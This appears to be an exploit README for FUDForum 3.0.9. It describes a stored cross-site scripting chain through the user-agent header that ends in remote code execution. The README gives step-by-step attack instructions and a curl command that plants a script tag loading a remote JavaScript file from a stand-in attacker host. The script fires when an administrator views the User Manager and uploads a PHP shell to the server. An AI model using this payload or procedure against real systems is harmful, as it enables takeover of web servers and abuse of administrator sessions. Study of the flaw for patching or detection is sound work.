# FUDforum-XSS-RCE
FUDForum 3.0.9 - XSS / Remote Code Execution

- Date                  : 10/26/19
- Exploit Author        : liquidsky (JMcPeters)
- Vulnerable Software   : FUDForum 3.0.9
- Vendor Homepage       : http://fudforum.org/forum/
- Version               : 3.0.9
- Software Link         : https://sourceforge.net/projects/fudforum/
- Tested On             : Windows / mysql / apache
- Author Site           : http://incidentsecurity.com | demo: https://youtu.be/0gsJQ82TXw4
- CVE                   : TBD

Greetz : wetw0rk, Fr13ndz, offsec

Description: FUDForum 3.0.9 is vulnerable to XSS via the user-agent request header.
This may result in remote code execution. An attacker can use a user account to fully compromise the system using a GET request.
When the admin visits the user information under "User Manager" in the control panel the payload will execute.
This will allow for PHP files to be written to the web root, and for code to execute on the remote server. 

Notes: 

1. Register an account and log in to the forum. If you have an IP already associated with a registered user this is not required.
   This step is so when you run the XSS payload from your attacker machine it gets logged under the user activity.

2. Send the XSS payload below (from an IP associated with an account) / host the script:
curl -A '<script src="http://attacker.machine/fud.js"></script>' http://target.machine/fudforum/index.php

3. When the admin visits the user information from the admin controls / User Manager the payload will fire under "Recent sessions", uploading a php shell on the remote system.
